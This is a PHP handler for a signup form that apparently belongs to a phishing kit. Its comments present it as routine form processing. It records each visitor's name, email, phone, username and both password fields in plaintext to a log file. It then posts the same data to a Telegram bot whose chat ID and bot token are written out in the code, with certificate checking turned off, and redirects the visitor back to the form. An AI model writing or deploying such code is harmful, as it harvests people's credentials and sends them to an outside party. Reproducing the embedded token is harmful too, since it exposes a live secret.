<?php

// Check if the form is being submitted using the POST method
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Sanitize and validate form data
    $fname = isset($_POST["fname"]) ? htmlspecialchars($_POST["fname"]) : "";
    $email = isset($_POST["email"]) ? filter_var($_POST["email"], FILTER_SANITIZE_EMAIL) : "";
    $tele = isset($_POST["tele"]) ? htmlspecialchars($_POST["tele"]) : "";
    $username = isset($_POST["username"]) ? htmlspecialchars($_POST["username"]) : "";
    $password1 = isset($_POST["password1"]) ? $_POST["password1"] : ""; // Consider using password_hash() for secure storage
    $password2 = isset($_POST["password2"]) ? $_POST["password2"] : ""; // Consider using password_verify() for secure retrieval

    // Write the form data to a log file
    $file = fopen("Log.txt", "a");
    if ($file) {
        fwrite($file, "############ \n");
        fwrite($file, ">Firstname: " . $fname . "\n");
        fwrite($file, ">Email: " . $email . "\n");
        fwrite($file, ">Tele: " . $tele . "\n");
        fwrite($file, ">Username: " . $username . "\n");
        fwrite($file, ">Password1: " . $password1 . "\n");
        fwrite($file, ">Password2: " . $password2 . "\n");
        fwrite($file, "############ \n\n");
        fclose($file);
    }

    // Notify through Telegram (if enabled)
    $telegramEnabled = true; // Set to true if Telegram notification is enabled
    if ($telegramEnabled) {
        $chatId = "5258142426"; // Your chat ID
        $botUrl = "6794346246:AAF_0zUfZd2aMHU7zK2I3_fCL7-ablTxNBo"; // Your bot API URL

        $txt = " ##### \n" . $fname . "\n" . $email . "\n" . $tele . "\n" . $username . "\n" . $password1 . "\n" . $password2 . "\n";
        
        $send = ['chat_id' => $chatId, 'text' => $txt];
        $ch = curl_init($botUrl . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    // Redirect after processing the form
    header("location: signup.html");
    exit; // Terminate script execution
} else {
    // Handle non-POST requests (if needed)
    http_response_code(405); // Method Not Allowed
    // You can provide an error message or a redirect to the valid form submission page
    exit;
}
?>

